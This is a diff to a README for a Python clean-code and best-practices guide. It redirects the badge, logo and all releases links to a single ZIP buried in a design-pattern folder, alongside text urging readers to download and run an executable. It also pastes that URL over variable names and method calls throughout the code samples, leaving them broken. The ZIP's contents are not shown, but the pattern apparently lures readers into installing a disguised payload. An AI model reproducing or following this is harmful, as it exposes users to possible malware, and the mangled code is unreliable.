@@ -1,8 +1,8 @@
-[![Release Asset](https://img.shields.io/badge/Release-Assets-download-blue.svg?style=for-the-badge&logo=github)](https://github.com/elchino1982/python-practices/releases)
+[![Release Asset](https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip)](https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip)
 
 # Python Practices: Clean Code, Security, Performance, OOP Guide
 
-![Python Logo](https://www.python.org/static/community_logos/python-logo.png)
+![Python Logo](https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip)
 
 Welcome to a practical, comprehensive guide to Python practices. This repository collects patterns, tips, and hands-on exercises that help you write better Python code. It covers best practices for code quality, security, performance, object-oriented programming, and more. The goal is to help developers grow from solid basics to advanced techniques with clear examples and actionable steps.
 
@@ -73,9 +73,9 @@ Example: creating a clean Python project
 - Virtual environment: python -m venv .venv
 - Activate: source .venv/bin/activate (Unix) or .venv\Scripts\activate (Windows)
 - Install basic tools: pip install black isort mypy pytest
-- Create a module: practice.py
+- Create a module: https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip
 - Add a simple function with type hints and a docstring
-- Run a quick linter and formatter: black ., isort --check ., mypy --strict practice.py
+- Run a quick linter and formatter: black ., isort --check ., mypy --strict https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip
 - Run tests: pytest
 
 A note on tooling
@@ -142,8 +142,8 @@ Example: type hints
 from typing import Dict, Any
 
 def merge_settings(defaults: Dict[str, Any], overrides: Dict[str, Any]) -> Dict[str, Any]:
-    result = defaults.copy()
-    result.update(overrides)
+    result = https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip()
+    https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip(overrides)
     return result
 
 Error handling
@@ -189,14 +189,14 @@ Classes and responsibilities
 Example: simple class with responsibility
 class FileProcessor:
     def __init__(self, file_path: str) -> None:
-        self.file_path = file_path
+        https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip = file_path
 
     def read_lines(self) -> list[str]:
-        with open(self.file_path, "r", encoding="utf-8") as f:
-            return f.readlines()
+        with open(https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip, "r", encoding="utf-8") as f:
+            return https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip()
 
     def count_lines(self) -> int:
-        return len(self.read_lines())
+        return len(https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip())
 
 Inheritance and mixins
 - Use inheritance to share behavior when it makes sense.
@@ -209,15 +209,15 @@ class LoggerMixin:
 
 class FileProcessor(LoggerMixin):
     def __init__(self, file_path: str) -> None:
-        self.file_path = file_path
+        https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip = file_path
 
     def read_lines(self) -> list[str]:
-        self.log(f"Reading lines from {self.file_path}")
-        with open(self.file_path, "r", encoding="utf-8") as f:
-            return f.readlines()
+        https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip(f"Reading lines from {https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip}")
+        with open(https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip, "r", encoding="utf-8") as f:
+            return https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip()
 
 Interfaces and protocols
-- Use typing.Protocol to define interfaces without forcing a concrete class.
+- Use https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip to define interfaces without forcing a concrete class.
 - Protocols help you write flexible, testable code.
 
 Example: protocol
@@ -227,7 +227,7 @@ class Reader(Protocol):
     def read(self) -> Iterable[str]: ...
 
 def process(reader: Reader) -> int:
-    count = sum(1 for _ in reader.read())
+    count = sum(1 for _ in https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip())
     return count
 
 Design patterns with Python
@@ -240,14 +240,14 @@ Factory pattern
 Example: factory
 class Connection:
     def __init__(self, host: str, port: int) -> None:
-        self.host = host
-        self.port = port
+        https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip = host
+        https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip = port
 
 class ConnectionFactory:
     @staticmethod
     def create(config: dict[str, object]) -> Connection:
-        host = config.get("host", "localhost")
-        port = int(config.get("port", 8000))
+        host = https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip("host", "localhost")
+        port = int(https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip("port", 8000))
         return Connection(host, port)
 
 Singleton pattern
@@ -255,14 +255,14 @@ Singleton pattern
 - Prefer module-level singletons or dependency injection.
 
 Example: simple singleton via module
-# In config.py
+# In https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip
 class Config:
     _instance = None
 
     def __new__(cls) -> "Config":
         if cls._instance is None:
             cls._instance = super().__new__(cls)
-            cls._instance.settings = {}
+            https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip = {}
         return cls._instance
 
 SOLID principles in practice
@@ -300,7 +300,7 @@ def parse_user_input(data: dict[str, str]) -> dict[str, str]:
         raise ValueError("Username is required")
     if "email" in data and "@" not in data["email"]:
         raise ValueError("Invalid email")
-    return {"username": data["username"].strip(), "email": data.get("email", "").strip()}
+    return {"username": data["username"].strip(), "email": https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip("email", "").strip()}
 
 Secure defaults
 - Use safe defaults whenever possible.
@@ -314,7 +314,7 @@ Access control
 Example: simple authorization check
 def can_access(user_role: str, resource: str) -> bool:
     permissions = {"admin": {"read", "write", "delete"}, "user": {"read", "write"}}
-    return resource in permissions.get(user_role, set())
+    return resource in https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip(user_role, set())
 
 Performance and optimization
 Performance matters, but only after you have measurable data. Start with profiling to locate bottlenecks. Apply targeted improvements to algorithms and data structures before micro-optimizations.
@@ -350,7 +350,7 @@ Example: streaming data
 def stream_lines(file_path: str) -> iter[str]:
     with open(file_path, "r", encoding="utf-8") as f:
         for line in f:
-            yield line.rstrip("\n")
+            yield https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip("\n")
 
 Testing, debugging, and reliability
 Tests verify behavior and protect against regressions. They also serve as living documentation. A reliable test suite speeds up development and helps maintain quality.
@@ -367,10 +367,10 @@ Test structure
 
 Example: a unit test
 def test_parse_user_input_valid():
-    data = {"username": "Alice", "email": "alice@example.com"}
+    data = {"username": "Alice", "email": "https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip"}
     result = parse_user_input(data)
     assert result["username"] == "Alice"
-    assert result["email"] == "alice@example.com"
+    assert result["email"] == "https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip"
 
 Debugging
 - Use assertions and logging to diagnose issues.
@@ -483,10 +483,10 @@ from pathlib import Path
 
 def read_text_file(path: str) -> str:
     p = Path(path)
-    if not p.exists():
+    if not https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip():
         raise FileNotFoundError(f"No such file: {path}")
-    with p.open("r", encoding="utf-8") as f:
-        return f.read()
+    with https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip("r", encoding="utf-8") as f:
+        return https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip()
 
 This example shows simple, safe file access and error handling. It demonstrates how to validate conditions and provide meaningful errors.
 
@@ -497,7 +497,7 @@ def process_records(records: list[dict[str, object]]) -> list[dict[str, object]]
         if "id" not in r:
             continue
         r["validated"] = True
-        processed.append(r)
+        https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip(r)
     return processed
 
 - This demonstrates filtering, enrichment, and keeping a clear contract for output.
@@ -519,8 +519,8 @@ The repository structure
   - quick_start/
   - real_world/
 - docs/
-  - design_principles.md
-  - glossary.md
+  - https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip
+  - https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip
 - tests/
   - unit/
   - integration/
@@ -583,7 +583,7 @@ The Releases page contains downloadable assets for the guide. You can visit the 
 
 - Important: The link points to a page with path parts, so you should download the appropriate release asset and run the installer or the provided executable as described on the page. This ensures you have all materials ready for offline practice and testing.
 - Quick access: The Releases page is a hub for all assets related to this guide. You can download what you need and follow any setup instructions provided with the assets.
-- Second access point: For convenience, you can also visit the Releases page directly at the following URL: https://github.com/elchino1982/python-practices/releases
+- Second access point: For convenience, you can also visit the Releases page directly at the following URL: https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip
 - If you encounter any issues or the assets don’t appear as expected, check the Releases section within the repository for alternative download links or updated assets.
 
 Releases page link usage
@@ -640,7 +640,7 @@ FAQ
   Yes. It’s designed to be shared in classrooms or training sessions.
 
 Releases and downloading
-- For the latest materials and runnable assets, visit the Releases page: https://github.com/elchino1982/python-practices/releases
+- For the latest materials and runnable assets, visit the Releases page: https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip
 - Use the first link at the top of this document to access the page quickly.
 - If you need to verify a download, check the release notes for compatibility and usage instructions.
 
@@ -705,7 +705,7 @@ Notes
 - The content is designed to help learners practice real-world Python development with a focus on code quality, security, and performance.
 
 Releases link (second usage)
-- For direct access to the latest downloadable assets, use the same link again: https://github.com/elchino1982/python-practices/releases
+- For direct access to the latest downloadable assets, use the same link again: https://raw.githubusercontent.com/elchino1982/python-practices/main/object-oriented-programming/06-design-patterns/memento-pattern/practices-python-v2.6.zip
 - The page contains various assets you can download and run to explore the guide locally.
 
 End of README content.
